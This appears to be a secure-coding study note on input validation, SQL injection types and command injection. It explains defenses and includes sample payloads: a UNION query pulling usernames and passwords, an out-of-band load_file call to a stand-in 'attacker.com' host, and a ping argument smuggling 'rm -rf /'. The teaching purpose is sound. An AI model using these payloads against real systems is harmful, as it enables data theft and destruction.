


# 📌 1.1 Input Validation & Injection

## 🔍 What is Input Validation?
Input validation is the process of ensuring user-provided input is clean, correct, and safe before it's processed by the application. Proper validation prevents malicious data from entering the system and triggering unintended behaviors.

---

## 🚨 Why It Matters
Failing to validate input properly can lead to:
- SQL Injection
- Command Injection
- Cross-Site Scripting (XSS)
- Path Traversal
- Local/Remote File Inclusion
- Buffer Overflow

---

## 🧪 Types of Validation

| Type | Description |
|------|-------------|
| **Whitelist** | Only allow defined, expected values (most secure) |
| **Blacklist** | Disallow known bad values (bypassable) |
| **Length checks** | Enforce size constraints |
| **Format checks** | Validate pattern using regex (e.g., email, phone) |
| **Type checks** | Enforce input types (e.g., number, string, boolean) |
| **Encoding checks** | Ensure no untrusted control characters are accepted |

---

## 🔐 Security Best Practices

- Always validate on the **server side**
- Use built-in validation libraries
- Normalize input before validation (trim, decode)
- Don’t rely on client-side validation for security
- Apply contextual output encoding (e.g., HTML, JS, SQL)

---

## ⚔️ Types of SQL Injection (with Definitions & Examples)

### 1. In-Band SQLi
The attacker uses the **same communication channel** to both launch the attack and gather the results.

- **a. Error-Based SQLi**: Relies on database error messages to extract data  
  _Example_: `' OR 1=1 ORDER BY 100--` (triggers error if column doesn't exist)

- **b. Union-Based SQLi**: Uses the `UNION` keyword to combine results of two queries  
  _Example_: `' UNION SELECT username, password FROM users--`

### 2. Inferential SQLi (Blind SQLi)
The attacker **doesn't get direct output** but observes app behavior (true/false, time delay) to infer data.

- **a. Boolean-Based**: Alters logic to get different responses  
  _Example_: `' AND 1=1 --` (valid), `' AND 1=2 --` (invalid)

- **b. Time-Based**: Uses delay functions to confirm conditions  
  _Example_: `' OR IF(1=1, SLEEP(5), 0) --`

### 3. Out-of-Band SQLi
Leverages external services (like DNS or HTTP) to exfiltrate data from the database when no direct or timing-based feedback is possible.  
_Example_: `'; SELECT load_file('\\\\attacker.com\\share') --`

## 📉 Injection Attacks Overview

Injection occurs when untrusted input is interpreted as code or commands by the application. Examples:

### 🛠 SQL Injection
```sql
SELECT * FROM users WHERE username = '$user_input'
```
If `$user_input = ' OR 1=1 --`, the query becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --'
```

### 🛠 Command Injection
```bash
ping $host
```
If `$host = 8.8.8.8; rm -rf /`, it triggers a shell injection.

---

## 🧰 Recommended Defenses

- Use parameterized queries (prepared statements)
- Avoid shell command concatenation with user input
- Validate input strictly against expected values
- Employ Web Application Firewalls (WAFs) as a defense-in-depth

---

## 🧠 Key Takeaways

- Treat all user input as untrusted
- Validate early, encode later
- Combine validation + context-aware encoding
- Prevent injection by avoiding unsafe interpreters
